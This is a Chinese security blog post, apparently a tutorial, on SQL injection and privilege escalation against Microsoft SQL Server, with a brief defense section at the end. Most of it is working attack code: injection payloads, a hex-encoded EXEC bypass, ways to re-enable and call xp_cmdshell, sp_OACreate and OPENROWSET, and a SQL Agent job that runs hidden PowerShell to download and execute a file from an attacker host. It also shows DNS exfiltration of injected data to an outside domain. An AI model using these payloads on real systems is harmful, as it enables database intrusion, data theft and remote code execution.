> 原文链接: https://www.anquanke.com//post/id/86011 


# 【技术分享】MSSQL 注入攻击与防御


                                阅读量   
                                **421829**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



**[![](https://p3.ssl.qhimg.com/t01a0ce74cd27245838.jpg)](https://p3.ssl.qhimg.com/t01a0ce74cd27245838.jpg)**

****

作者：[**rootclay**](http://bobao.360.cn/member/contribute?uid=573700421)

**预估稿费：400RMB**

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**传送门**

[**【技术分享】MySQL 注入攻击与防御**](http://bobao.360.cn/learning/detail/3758.html)

**<br>**

**前言**

上一篇文章已经为大家推出了[**MySQL注入攻击与防御**](http://bobao.360.cn/learning/detail/3758.html)，这里再写一下MSSQL注入攻击与防御，同样对与错误的地方希望大家指出共同进步

本文所用数据库涉及SQL Server 2k5,2k8,2k12,其次对于绕过姿势和前文并无太大差别,就不做过多的讲解,主要放在后面的提权上

<br>

**系统库**

[![](https://p5.ssl.qhimg.com/t01bdef80f5a3e75780.png)](https://p5.ssl.qhimg.com/t01bdef80f5a3e75780.png)



**注释**

[![](https://p3.ssl.qhimg.com/t01f06f544e34967d87.png)](https://p3.ssl.qhimg.com/t01f06f544e34967d87.png)

**实例：**



```
SELECT * FROM Users WHERE username = '' OR 1=1 --' AND password = '';
SELECT * FROM Users WHERE id = '' UNION SELECT 1, 2, 3/*';
```



**版本&amp;数据库当前用户&amp;主机名**

**版本**

```
select @@VERSION
```

如果是2012的数据库返回为True

```
SELECT * FROM Users WHERE id = '1' AND @@VERSION LIKE '%2012%';
```

**数据库当前用户**

[![](https://p4.ssl.qhimg.com/t01c646303c3577fb19.png)](https://p4.ssl.qhimg.com/t01c646303c3577fb19.png)

**实例：**



```
Return current user:
SELECT loginame FROM master..sysprocesses WHERE spid=@@SPID;
Check if user is admin:
SELECT (CASE WHEN (IS_SRVROLEMEMBER('sysadmin')=1) THEN '1' ELSE '0' END);
```

**主机名**

```
select @@SERVERNAME
```



**库&amp;表&amp;列**

**库名**

[![](https://p5.ssl.qhimg.com/t0176538d98f83f660e.png)](https://p5.ssl.qhimg.com/t0176538d98f83f660e.png)

**测试列数**

```
ORDER BY n+1;
```

**实例:**



```
query: SELECT username, password FROM Users WHERE id = '1';
1' ORDER BY 1-- True
1' ORDER BY 2-- True
1' ORDER BY 3-- False - 查询使用了2列
-1' UNION SELECT 1,2--  True
GROUP BY / HAVING
```

**实例：**



```
query: SELECT username, password FROM Users WHERE id = '1';
1' HAVING 1=1                                       -- 错误
1' GROUP BY username HAVING 1=1--                   -- 错误
1' GROUP BY username, password HAVING 1=1--         -- 正确
Group By可以用来测试列名
```

**获取表名**

[![](https://p3.ssl.qhimg.com/t01dc40766d2d4a4cdb.png)](https://p3.ssl.qhimg.com/t01dc40766d2d4a4cdb.png)

这里使用的U表示用户表，还有视图和存储过程分别表示为    U = 用户表, V = 视图 , X = 扩展存储过程

**获取列名**

[![](https://p3.ssl.qhimg.com/t012367b5e92d8028e6.png)](https://p3.ssl.qhimg.com/t012367b5e92d8028e6.png)

**接收多条数据**

**临时表**

除了上述的查询方式在MSSQL中可以使用临时表来查看数据,步骤如下



```
//1.创建临时表/列和插入数据：
BEGIN DECLARE @test varchar(8000) SET @test=':' SELECT @test=@test+' '+name FROM sysobjects WHERE xtype='U' AND name&gt;@test SELECT @test AS test INTO TMP_DB END;
//2.转储内容：
SELECT TOP 1 SUBSTRING(test,1,353) FROM TMP_DB;
//3.删除表：
DROP TABLE TMP_DB;
```

**XML列数据**

```
SELECT table_name FROM information_schema.tables FOR XML PATH('')
```

**字符串连接符**

相对于MySQL来说少了两个函数,有如下方式连接:



```
SELECT CONCAT('a','a','a'); (SQL SERVER 2012)
SELECT 'a'+'d'+'mi'+'n';
```

**条件语句&amp;时间**

**条件语句**



```
IF...ELSE...//注意IF是不能再SELECT语句中使用的
CASE...WHEN...ELSE...
```

**实例:**



```
IF 1=1 SELECT 'true' ELSE SELECT 'false';
SELECT CASE WHEN 1=1 THEN true ELSE false END;
```

**时间**



```
WAITFOR DELAY 'time_to_pass';
WAITFOR TIME 'time_to_execute';
IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';//这里表示,如果条件成立,延迟5s
```

**文件**

**查看文件权限**



```
CREATE TABLE mydata (line varchar(8000));
BULK INSERT mydata FROM ‘c:boot.ini’;
DROP TABLE mydata;
```

**定位数据库文件**

```
EXEC sp_helpdb master; –location of master.mdf
```

**绕过技巧**

这里讲绕过技巧的话其实很多和MySQL的绕过姿势都是类似的,就举几个常见的,其他的可以参见前面的MySQL注入攻击与防御

**绕过引号**

```
SELECT * FROM Users WHERE username = CHAR(97) + CHAR(100) + CHAR(109) + CHAR(105) + CHAR(110)
```

**16进制转换绕过**

```
' AND 1=0; DECLARE @S VARCHAR(4000) SET @S=CAST(0x44524f50205441424c4520544d505f44423b AS VARCHAR(4000)); EXEC (@S);--
```



**MSSQL提权**

这里先推荐一个工具[**PowerUpSQL**](https://github.com/NetSPI/PowerUpSQL),主要用于对SQL Server的攻击,还能快速清点内网中SQL Server的机器,更多的信息可以到GitHub上查看使用.

其次下面主要讲的一些提权姿势为存储过程提权,想要查看数据库中是否有对应的存储过程,可以用下面的语句:

```
select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
```

或者查询对应数据库中定义的存储过程有哪些:



```
SELECT ROUTINE_CATALOG,SPECIFIC_SCHEMA,ROUTINE_NAME,ROUTINE_DEFINITION
FROM MASTER.INFORMATION_SCHEMA.ROUTINES
ORDER BY ROUTINE_NAME
```

推荐一篇文章,是关于证书登录提权的[**文章**](https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/)

**xp_cmdshell**

```
EXEC master.dbo.xp_cmdshell 'cmd';
```

最为经典的就是这个组件了,但是2005之后就默认关闭,而且现在来说都会把这个扩展删除掉

[![](https://p0.ssl.qhimg.com/t016aec93a269996851.png)](https://p0.ssl.qhimg.com/t016aec93a269996851.png)

因为xp_cmdshell用得最多,这里就xp_cmdshell使用过程中可能遇到的和网上收集问题列举一下:

首先说明一下,下面用到的addextendedproc的时候是没有开启的,试了一些语句,下面的语句可以创建一个存储过程:



```
use master
go
create procedure sp_addextendedproc
@functname nvarchar(517),
@dllname varchar(255)
as
set implicit_transactions off
if @@trancount &gt; 0
begin
raiserror(15002,-1,-1,'sp_addextendedproc')
return (1)
end
dbcc addextendedproc( @functname, @dllname)
return (0)
```

1. 未能找到存储过程'master..xpcmdshell'.

恢复方法：



```
EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll' declare @o int 
EXEC sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll'
```

2. 无法装载 DLL xpsql70.dll 或该DLL所引用的某一 DLL。原因126（找不到指定模块。）

恢复方法：



```
EXEC sp_dropextendedproc "xp_cmdshell"
EXEC sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll'
```

3. 无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指定的程序。)

恢复方法：



```
exec sp_dropextendedproc 'xp_cmdshell'
exec sp_addextendedproc 'xp_cmdshell','xpweb70.dll'
```

4. SQL Server 阻止了对组件 'xp_cmdshell' 的 过程'sys.xp_cmdshell' 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 'xp_cmdshell'。有关启用 'xp_cmdshell' 的详细信息，请参阅 SQL Server 联机丛书中的 "外围应用配置器"。

恢复方法：

```
执行:EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
```

**xp_dirtree**

获取文件信息,可以列举出目录下所有的文件与文件夹

参数说明:目录名,目录深度,是否显示文件 



```
execute master..xp_dirtree 'c:' 
execute master..xp_dirtree 'c:',1 
execute master..xp_dirtree 'c:',1,1
```

**OPENROWSET**

OPENROWSET 在MSSQL 2005及以上版本中默认是禁用的.需要先打开:

打开语句:

[![](https://p5.ssl.qhimg.com/t0168fd0f7b16dcccbf.png)](https://p5.ssl.qhimg.com/t0168fd0f7b16dcccbf.png)

然后执行:

```
SELECT * FROM OPENROWSET('SQLOLEDB', '数据库地址';'数据库用户名';'数据库密码', 'SET FMTONLY OFF execute master..xp_cmdshell "dir"');
```

这种攻击是需要首先知道用户密码的.

**沙盒**

开启沙盒：



```
exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWAREMicrosoftJet4.0Engines','SandBoxMode','REG_DWORD',1
执行命令:
select * from openrowset('microsoft.jet.oledb.4.0',';database=c:windowssystem32iasdnary.mdb','select shell("whoami")')
```

**SP_OACREATE**

其实xp_cmdshell一般会删除掉了,如果xp_cmdshell 删除以后，可以使用SP_OACreate

需要注意的是这个组件是无回显的,你可以把他直接输出到web目录下的文件然后读取

[![](https://p5.ssl.qhimg.com/t01d2c9bfdc0828e902.png)](https://p5.ssl.qhimg.com/t01d2c9bfdc0828e902.png)

下面是收集来的sp_OACreate的一些命令:

[![](https://p5.ssl.qhimg.com/t01ee20583fb3dd8605.png)](https://p5.ssl.qhimg.com/t01ee20583fb3dd8605.png)

**Agent Job**

关于Agent job执行命令的这种情况是需要开启了MSSQL Agent Job服务才能执行,这里列出命令,具体的原理在安全客已经有过总结[**这里**](http://bobao.360.cn/learning/detail/3070.html)



```
USE msdb;
EXEC dbo.sp_add_job @job_name = N'clay_powershell_job1' ; 
EXEC sp_add_jobstep 
    @job_name = N'clay_powershell_job1', 
    @step_name = N'clay_powershell_name1', 
    @subsystem = N'PowerShell', 
    @command = N'powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(''http://Your_IP/Your_file''))"', 
    @retry_attempts = 1, 
    @retry_interval = 5;
EXEC dbo.sp_add_jobserver 
    @job_name = N'clay_powershell_job1'; 
EXEC dbo.sp_start_job N'clay_powershell_job1';
```

**Else**

MSSQL还有其他的很多存储过程可以调用,下面做一个小列举,有兴趣的朋友可以逐一研究:

[![](https://p0.ssl.qhimg.com/t0157a92f2ef0c2c091.png)](https://p0.ssl.qhimg.com/t0157a92f2ef0c2c091.png)

下面是关于一些存储过程调用的例子:

[![](https://p0.ssl.qhimg.com/t017b236023c85a7055.png)](https://p0.ssl.qhimg.com/t017b236023c85a7055.png)



**<br>**

**Out-of-Band**

关于带外注入在上一篇文章已经有讲到,但DNS注入只讲了利用,这里做了一张图为大家讲解,同样的SMB Relay Attack 也是存在的,可自行实现.

下图就是DNS注入中的请求过程

[![](https://p2.ssl.qhimg.com/t014e85b648a3d7f64f.png)](https://p2.ssl.qhimg.com/t014e85b648a3d7f64f.png)

那么SQL Server的DNS注入和MySQl稍有不容,但都是利用了SMB协议



```
Param=1; SELECT * FROM OPENROWSET('SQLOLEDB', (`{`INJECT`}`)+'.rootclay.club';'sa';'pwd', 'SELECT 1')
Makes DNS resolution request to `{`INJECT`}`.rootclay.club
```



**防御**

对于代码上的防御在上一篇文章已有总结,就不多BB了…..这里主要说一下存储过程方面的东西

1. 设置TRUSTWORTHY为offALTER DATABASE master SET TRUSTWORTHY OFF

2. 确保你的存储过程的权限不是sysadmin权限的

3. 对于 PUBLIC用户是不能给存储过程权限的REVOKE EXECUTE ON 存储过程 to PUBLIC

4. 对于自己不需要的存储过程最好删除

5. 当然,在代码方面就做好防御是最好的选择,可以参见上篇文章

<br>

**参考**

[http://www.blackhat.com/presentations/bh-europe-09/Guimaraes/Blackhat-europe-09-Damele-SQLInjection-slides.pdf](http://www.blackhat.com/presentations/bh-europe-09/Guimaraes/Blackhat-europe-09-Damele-SQLInjection-slides.pdf) 

[http://colesec.inventedtheinternet.com/hacking-sql-server-with-xp_cmdshell/](http://colesec.inventedtheinternet.com/hacking-sql-server-with-xp_cmdshell/) 

[http://www.cnblogs.com/zhycyq/articles/2658225.html](http://www.cnblogs.com/zhycyq/articles/2658225.html) 

[https://evi1cg.me/tag/mssql/](https://evi1cg.me/tag/mssql/) 

[http://404sec.lofter.com/post/1d16b278_6329f6d](http://404sec.lofter.com/post/1d16b278_6329f6d) 

<br>



**传送门**

**[【技术分享】MySQL 注入攻击与防御](http://bobao.360.cn/learning/detail/3758.html)**


